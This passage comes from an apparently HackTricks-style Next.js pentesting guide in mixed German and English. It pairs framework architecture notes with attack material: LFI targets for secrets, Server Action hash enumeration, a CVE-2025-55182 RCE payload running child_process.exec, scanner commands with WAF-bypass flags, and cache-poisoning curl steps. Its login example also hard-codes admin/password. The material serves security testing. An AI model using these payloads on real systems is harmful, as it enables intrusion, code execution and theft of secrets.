**Problem:**

- **Offenlegung sensibler Pfade:** Das Aliasing sensibler Verzeichnisse und die Ermöglichung des client-side Zugriffs können vertrauliche Informationen leak.
- **Bündeln von Secrets:** Wenn sensible Dateien für den client gebündelt werden, sind ihre Inhalte über source maps oder durch Inspektion des client-side Codes zugänglich.

**Wie Angreifer es ausnutzen:**

Angreifer können auf die Verzeichnisstruktur der Anwendung zugreifen oder sie rekonstruieren, wodurch sie potenziell sensible Dateien oder Daten finden und ausnutzen können.

</details>

### `pages/_app.js` und `pages/_document.js`

#### **`pages/_app.js`**

**Purpose:** Überschreibt die Standard-App-Komponente und ermöglicht globalen State, Styles und Layout-Komponenten.

**Anwendungsfälle:**

- Einbinden von globalem CSS.
- Hinzufügen von Layout-Wrappern.
- Integration von State-Management-Bibliotheken.

**Beispiel:**
```jsx
// pages/_app.js
import "../styles/globals.css"

function MyApp({ Component, pageProps }) {
return <Component {...pageProps} />
}

export default MyApp
```
#### **`pages/_document.js`**

**Zweck:** Überschreibt das standardmäßige Document und ermöglicht die Anpassung der `<html>`- und `<body>`-Tags.

**Anwendungsfälle:**

- Ändern der `<html>`- oder `<body>`-Tags.
- Hinzufügen von meta-Tags oder benutzerdefinierten Skripten.
- Einbinden von Drittanbieter-Schriften.

**Beispiel:**
```jsx
// pages/_document.js
import Document, { Html, Head, Main, NextScript } from "next/document"

class MyDocument extends Document {
render() {
return (
<Html lang="en">
<Head>{/* Custom fonts or meta tags */}</Head>
<body>
<Main />
<NextScript />
</body>
</Html>
)
}
}

export default MyDocument
```
### Eigener Server (optional)

**Zweck:** Obwohl Next.js mit einem eingebauten Server geliefert wird, kannst du einen eigenen Server für fortgeschrittene Anwendungsfälle erstellen, z. B. für benutzerdefiniertes Routing oder die Integration mit bestehenden Backend-Services.

**Hinweis:** Die Verwendung eines eigenen Servers kann die Deployment-Optionen einschränken, insbesondere auf Plattformen wie Vercel, die für den eingebauten Server von Next.js optimiert sind.

**Beispiel:**
```javascript
// server.js
const express = require("express")
const next = require("next")

const dev = process.env.NODE_ENV !== "production"
const app = next({ dev })
const handle = app.getRequestHandler()

app.prepare().then(() => {
const server = express()

// Custom route
server.get("/a", (req, res) => {
return app.render(req, res, "/a")
})

// Default handler
server.all("*", (req, res) => {
return handle(req, res)
})

server.listen(3000, (err) => {
if (err) throw err
console.log("> Ready on http://localhost:3000")
})
})
```
---

## Zusätzliche Architektur- und Sicherheitsüberlegungen

### Umgebungsvariablen und Konfiguration

**Zweck:** Sensible Informationen und Konfigurationswerte außerhalb der Codebasis verwalten.

**Beste Praktiken:**

- **Verwende `.env`-Dateien:** Speichere Variablen wie API-Schlüssel in `.env.local` (vom Versionskontrollsystem ausgeschlossen).
- **Greife sicher auf Variablen zu:** Verwende `process.env.VARIABLE_NAME`, um auf Umgebungsvariablen zuzugreifen.
- **Geheimnisse niemals im Client offenlegen:** Stelle sicher, dass sensible Variablen nur serverseitig verwendet werden.

**Beispiel:**
```javascript
// next.config.js
module.exports = {
env: {
API_KEY: process.env.API_KEY, // Accessible on both client and server
SECRET_KEY: process.env.SECRET_KEY, // Be cautious if accessible on the client
},
}
```
**Hinweis:** Um Variablen ausschließlich auf die Serverseite zu beschränken, lassen Sie sie aus dem `env`-Objekt weg oder prefixen Sie sie mit `NEXT_PUBLIC_`, um sie dem Client zugänglich zu machen.

### Nützliche serverseitige Artefakte zur Zielerfassung via LFI/download endpoints

Wenn Sie in einer Next.js-App einen path traversal oder eine Download-API finden, zielen Sie auf kompilierte Artefakte ab, die serverseitige Geheimnisse und Auth-Logik leak:

- `.env` / `.env.local` für Session-Secrets und Provider-Credentials.
- `.next/routes-manifest.json` und `.next/build-manifest.json` für eine vollständige Routenliste.
- `.next/server/pages/api/auth/[...nextauth].js` um die kompilierte NextAuth-Konfiguration wiederherzustellen (enthält oft Fallback-Passwörter, wenn `process.env`-Werte nicht gesetzt sind).
- `next.config.js` / `next.config.mjs` zur Überprüfung von rewrites, redirects und Middleware-Routing.

### Authentication and Authorization

**Vorgehensweise:**

- **Session-Based Authentication:** Verwenden Sie Cookies, um Benutzersitzungen zu verwalten.
- **Token-Based Authentication:** Implementieren Sie JWTs für zustandslose Authentifizierung.
- **Third-Party Providers:** Integrieren Sie OAuth-Provider (z. B. Google, GitHub) mit Bibliotheken wie `next-auth`.

**Sicherheitspraktiken:**

- **Secure Cookies:** Setzen Sie die Attribute `HttpOnly`, `Secure` und `SameSite`.
- **Password Hashing:** Hashen Sie Passwörter immer, bevor Sie sie speichern.
- **Input Validation:** Verhindern Sie Injection-Angriffe, indem Sie Eingaben validieren und bereinigen.

**Beispiel:**
```javascript
// pages/api/login.js
import { sign } from "jsonwebtoken"
import { serialize } from "cookie"

export default async function handler(req, res) {
const { username, password } = req.body

// Validate user credentials
if (username === "admin" && password === "password") {
const token = sign({ username }, process.env.JWT_SECRET, {
expiresIn: "1h",
})
res.setHeader(
"Set-Cookie",
serialize("auth", token, {
path: "/",
httpOnly: true,
secure: true,
sameSite: "strict",
})
)
res.status(200).json({ message: "Logged in" })
} else {
res.status(401).json({ error: "Invalid credentials" })
}
}
```
### Performance-Optimierung

**Strategien:**

- **Image Optimization:** Verwende Next.js' `next/image`-Komponente für automatische Bildoptimierung.
- **Code Splitting:** Nutze dynamische Imports, um Code zu splitten und die anfänglichen Ladezeiten zu reduzieren.
- **Caching:** Implementiere Caching-Strategien für API-Antworten und statische Assets.
- **Lazy Loading:** Lade Komponenten oder Assets nur, wenn sie benötigt werden.

**Beispiel:**
```jsx
// Dynamic Import with Code Splitting
import dynamic from "next/dynamic"

const HeavyComponent = dynamic(() => import("../components/HeavyComponent"), {
loading: () => <p>Loading...</p>,
})
```
## Next.js Server Actions Enumeration (hash to function name via source maps)

Modernes Next.js verwendet “Server Actions”, die auf dem Server ausgeführt, aber vom Client aufgerufen werden. In Produktionsumgebungen sind diese Aufrufe undurchsichtig: alle POSTs landen auf einem gemeinsamen Endpoint und werden durch einen build-spezifischen Hash unterschieden, der im `Next-Action` Header gesendet wird. Beispiel:
```http
POST /
Next-Action: a9f8e2b4c7d1...
```
When `productionBrowserSourceMaps` is enabled, minified JS chunks contain calls to `createServerReference(...)` that leak enough structure (plus associated source maps) to recover a mapping between the action hash and the original function name. This lets you translate hashes observed in `Next-Action` into concrete targets like `deleteUserAccount()` or `exportFinancialData()`.

### Extraktionsansatz (regex auf minified JS + optionale source maps)

Durchsuche heruntergeladene JS-Chunks nach `createServerReference` und extrahiere den Hash sowie das Funktions-/Quell-Symbol. Zwei nützliche Muster:
```regex
# Strict pattern for standard minification
createServerReference\)"([a-f0-9]{40,})",\w+\.callServer,void 0,\w+\.findSourceMapURL,"([^"]+)"\)

# Flexible pattern handling various minification styles
createServerReference[^\"]*"([a-f0-9]{40,})"[^\"]*"([^"]+)"\s*\)
```
- Gruppe 1: server action hash (40+ hex chars)
- Gruppe 2: Symbol oder Pfad, das/die über die source map (falls vorhanden) auf die ursprüngliche Funktion aufgelöst werden kann

If the script advertises a source map (trailer comment `//# sourceMappingURL=<...>.map`), fetch it and resolve the symbol/path to the original function name.

### Praktischer Workflow

- Passive Entdeckung beim Browsen: Requests mit `Next-Action`-Headern und JS-Chunk-URLs erfassen.
- Die referenzierten JS-Bundles und zugehörigen `*.map`-Dateien herunterladen (falls vorhanden).
- Das obenstehende regex ausführen, um ein hash↔name-Wörterbuch zu erstellen.
- Das Wörterbuch verwenden, um gezielte Tests durchzuführen:
- Namensbasierte Triage (z. B. `transferFunds`, `exportFinancialData`).
- Coverage über Builds anhand des Funktionsnamens verfolgen (Hashes ändern sich zwischen Builds).

### Versteckte Actions ausführen (vorlagenbasierte Anfrage)

Nehmen Sie eine gültige POST-Anfrage, die im Proxy beobachtet wurde, als Vorlage und tauschen Sie den Wert `Next-Action` aus, um eine andere gefundene Action anzusprechen:
```http
# Before
Next-Action: a9f8e2b4c7d1

# After
Next-Action: b7e3f9a2d8c5
```
Im Repeater wiederholen und die Berechtigungsprüfung, Eingabevalidierung und Geschäftlogik von ansonsten nicht erreichbaren Aktionen testen.

### Burp automation

- NextjsServerActionAnalyzer (Burp extension) automatisiert das oben Beschriebene in Burp:
- Durchsucht den Proxy-Verlauf nach JS-Chunks, extrahiert `createServerReference(...)`-Einträge und parst Source Maps, wenn verfügbar.
- Pflegt ein durchsuchbares hash↔funktionsname-Wörterbuch und de-dupliziert über Builds hinweg anhand des Funktionsnamens.
- Kann ein gültiges Template-POST finden und einen fertig zum Senden vorbereiteten Repeater-Tab öffnen, in dem der Hash der Zielaktion eingesetzt ist.
- Repo: https://github.com/Adversis/NextjsServerActionAnalyzer

### Notes and limitations

- Erfordert, dass `productionBrowserSourceMaps` in production aktiviert ist, um Namen aus Bundles/Source Maps zu rekonstruieren.
- Die Offenlegung von Funktionsnamen ist für sich genommen keine Schwachstelle; nutze sie zur Orientierung bei der Entdeckung und teste die Berechtigung jeder Aktion.

### React Server Components Flight protocol deserialization RCE (CVE-2025-55182)

Next.js App Router deployments that expose Server Actions on `react-server-dom-webpack` **19.0.0–19.2.0 (Next.js 15.x/16.x)** enthalten eine kritische serverseitige prototype pollution während der Deserialisierung von **Flight**-Chunks. Durch das Konstruieren von `$`-Referenzen innerhalb einer Flight-Payload kann ein Angreifer von den gepolluten Prototypen auf beliebige JavaScript-Ausführung umschwenken und anschließend die Ausführung von OS-Befehlen im Node.js-Prozess erreichen.

{{#ref}}
../../pentesting-web/deserialization/nodejs-proto-prototype-pollution/README.md
{{#endref}}

#### Angriffskette in Flight-Chunks

1. **Prototype pollution primitive:** Setze `"then": "$1:__proto__:then"` so that the resolver writes a `then` function on `Object.prototype`. Any plain object processed afterwards becomes a thenable, letting the attacker influence async control flow inside RSC internals.
2. **Rebinding to the global `Function` constructor:** Point `_response._formData.get` at `"$1:constructor:constructor"`. During resolution, `object.constructor` → `Object`, and `Object.constructor` → `Function`, so future calls to `_formData.get()` actually execute `Function(...)`.
3. **Code execution via `_prefix`:** Place JavaScript source in `_response._prefix`. When the polluted `_formData.get` is invoked, the framework evaluates `Function(_prefix)(...)`, so the injected JS can run `require('child_process').exec()` or any other Node primitive.

#### Payload skeleton
```json
{
"then": "$1:__proto__:then",
"status": "resolved_model",
"reason": -1,
"value": "{\"then\":\"$B1337\"}",
"_response": {
"_prefix": "require('child_process').exec('id')",
"_chunks": "$Q2",
"_formData": { "get": "$1:constructor:constructor" }
}
}
```
#### Mapping der Exposition von React Server Functions

React Server Functions (RSF) sind Funktionen, die die 'use server';-Direktive enthalten. Jede form action, mutation oder jeder fetch helper, der an eine dieser Funktionen gebunden ist, wird zu einem RSC Flight endpoint, das problemlos vom Angreifer bereitgestellte Payloads deserialisieren kann. Nützliche recon steps, abgeleitet aus React2Shell assessments:

- **Static inventory:** Suche nach der Direktive, um zu verstehen, wie viele RSFs vom Framework automatisch offengelegt werden.
```bash
rg -n "'use server';" -g"*.{js,ts,jsx,tsx}" app/
```
- **App Router defaults:** `create-next-app` aktiviert standardmäßig den App Router + das `app/` Verzeichnis, wodurch stillschweigend jede Route zu einem RSC-fähigen Endpoint wird. App Router-Assets wie `/_next/static/chunks/app/` oder Antworten, die Flight-Chunks über `text/x-component` streamen, sind starke öffentlich sichtbare Fingerprints.
- **Implicitly vulnerable RSC deployments:** React’s own advisory weist darauf hin, dass Apps, die die RSC-Runtime ausliefern, ausnutzbar sein können **selbst ohne explizite RSFs**, behandle daher jedes Build, das `react-server-dom-*` 19.0.0–19.2.0 verwendet, als verdächtig.
- **Other frameworks bundling RSC:** Vite RSC, Parcel RSC, React Router RSC preview, RedwoodSDK, Waku, etc. verwenden denselben Serializer und übernehmen dieselbe remote Angriffsfläche, bis sie gepatchte React-Builds einbinden.

#### Versionsabdeckung (React2Shell)

- `react-server-dom-webpack`, `react-server-dom-parcel`, `react-server-dom-turbopack`: **anfällig** in 19.0.0, 19.1.0–19.1.1 und 19.2.0; **behoben** in 19.0.1, 19.1.2 und 19.2.1 jeweils.
- **Next.js stable:** App Router-Releases 15.0.0–16.0.6 enthalten den verwundbaren RSC-Stack. Patch-Trains 15.0.5 / 15.1.9 / 15.2.6 / 15.3.6 / 15.4.8 / 15.5.7 / 16.0.7 beinhalten gefixte deps, daher sind Builds unter diesen Versionen besonders interessant.
- **Next.js canary:** `14.3.0-canary.77+` liefert ebenfalls die fehlerhafte Runtime aus und hat derzeit keine gepatchten canary-Drops, weshalb diese Fingerprints starke Exploit-Kandidaten sind.

#### Remote-Detektions-Orakel

Assetnote’s [`react2shell-scanner`](https://github.com/assetnote/react2shell-scanner) sendet eine manipulierte multipart Flight-Anfrage an Kandidatenpfade und beobachtet das serverseitige Verhalten:

- **Default mode** führt eine deterministische RCE-Payload aus (Mathe-Operation, via `X-Action-Redirect` reflektiert), die Codeausführung nachweist.
- **`--safe-check` mode** verfälscht absichtlich die Flight-Nachricht, sodass gepatchte Server `200/400` zurückgeben, während verwundbare Ziele `HTTP/500`-Antworten ausgeben, die die Teilzeichenkette `E{"digest"` im Body enthalten. Dieses `(500 + digest)`-Paar ist derzeit das zuverlässigste remote-Orakel, das von Verteidigern veröffentlicht wurde.
- Eingebaute `--waf-bypass`, `--vercel-waf-bypass` und `--windows` Schalter passen das Payload-Layout an, fügen Junk voran oder tauschen OS-Kommandos aus, damit du reale Internet-Assets antesten kannst.
```bash
python3 scanner.py -u https://target.tld --path /app/api/submit --safe-check
python3 scanner.py -l hosts.txt -t 20 --waf-bypass -o vulnerable.json
```
### Weitere aktuelle App Router-Probleme (Ende 2025)

1. **RSC DoS & source disclosure (CVE-2025-55184 / CVE-2025-67779 / CVE-2025-55183)** – fehlerhafte Flight-Payloads können den RSC-Resolver in eine Endlosschleife treiben (pre-auth DoS) oder die Serialisierung von kompiliertem Server Function-Code erzwingen, um andere Aktionen zu ermöglichen. App Router-Builds ≥13.3 sind bis zum Patch betroffen; 15.0.x–16.0.x benötigen die spezifischen Patch-Zeilen aus dem Upstream-Advisory. Verwende den normalen Server Action-Pfad, aber streame einen `text/x-component`-Body mit missbräuchlichen `$`-Referenzen. Hinter einem CDN bleibt die hängende Verbindung durch Cache-Timeouts offen, wodurch der DoS kostengünstig wird.
- **Triage-Tipp:** Nicht gepatchte Ziele geben nach fehlerhaften Flight-Payloads `500` mit `E{"digest"` zurück; gepatchte Builds geben `400/200` zurück. Teste jeden Endpoint, der bereits Flight-Chunks streamt (achte auf `Next-Action`-Header oder `text/x-component`-Antworten) und spiele eine modifizierte Payload nach.

2. **RSC cache poisoning (CVE-2025-49005, App Router 15.3.0–15.3.2)** – fehlender `Vary`-Header ließ eine `Accept: text/x-component`-Antwort cachen und an Browser ausliefern, die HTML erwarten. Eine einzige Priming-Anfrage kann die Seite durch rohe RSC-Payloads ersetzen. PoC-Ablauf:
```bash
# Prime CDN with an RSC response
curl -k -H "Accept: text/x-component" "https://target/app/dashboard" > /dev/null
# Immediately fetch without Accept (victim view)
curl -k "https://target/app/dashboard" | head
```
Wenn die zweite Antwort JSON Flight-Daten statt HTML zurückgibt, ist die Route cache-vergiftbar. Cache nach dem Testen leeren.

## Quellen

- [Pentesting Next.js Server Actions — A Burp Extension for Hash-to-Function Mapping](https://www.adversis.io/blogs/pentesting-next-js-server-actions)
- [NextjsServerActionAnalyzer (Burp extension)](https://github.com/Adversis/NextjsServerActionAnalyzer)
- [CVE-2025-55182 React Server Components Remote Code Execution Exploit Tool](https://github.com/Spritualkb/CVE-2025-55182-exp)
- [CVE-2025-55182 & CVE-2025-66478 React2Shell – All You Need to Know](https://jfrog.com/blog/2025-55182-and-2025-66478-react2shell-all-you-need-to-know/)
- [0xdf – HTB Previous (Next.js middleware bypass, static export recon, NextAuth config leak)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [assetnote/react2shell-scanner](https://github.com/assetnote/react2shell-scanner)
- [Next.js Security Update: December 11, 2025 (CVE-2025-55183/55184/67779)](https://nextjs.org/blog/security-update-2025-12-11)
- [GHSA-r2fc-ccr8-96c4 / CVE-2025-49005: App Router cache poisoning](https://github.com/advisories/GHSA-r2fc-ccr8-96c4)

{{#include ../../banners/hacktricks-training.md}}
